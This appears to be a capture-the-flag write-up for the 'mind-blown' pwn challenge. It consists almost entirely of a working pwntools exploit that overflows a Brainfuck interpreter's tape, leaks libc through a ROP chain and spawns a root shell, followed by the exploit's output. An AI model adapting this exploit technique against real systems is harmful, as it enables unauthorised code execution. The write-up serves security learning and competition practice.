## mind-blown

Tags: _pwn_ _x86-64_ _bof_ _lame_ _brainfuck_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./mind-blown')

#context.log_level = 'DEBUG'

if args.REMOTE:
	p = remote('ctf2021.hackpack.club', 10996)
	#libc = ELF('./libc-2.31.so')
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.readProgramFromStdin)
payload += p64(binary.sym.runProgram)

loader  = b''
loader += (0x1010 + 8) * b'>'
loader += len(payload) * b',>'
loader += b'\0'

p.sendlineafter('program: ',str(len(loader)))
p.sendafter('below:\n',loader)
p.send(payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

time.sleep(.1)

# need to rewind pointer
loader  = b''
loader += len(payload) * b'<'

payload  = b''
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

loader += len(payload) * b',>'
loader += b'\0'

p.sendlineafter('program: ',str(len(loader)))
p.sendafter('below:\n',loader)
p.send(payload)
p.interactive()
```

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/hackpackctf2021/mind_blown/mind-blown'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/pwd/datajerk/hackpackctf2021/mind_blown/mind-blown': pid 32889
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fa518eb5000
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```
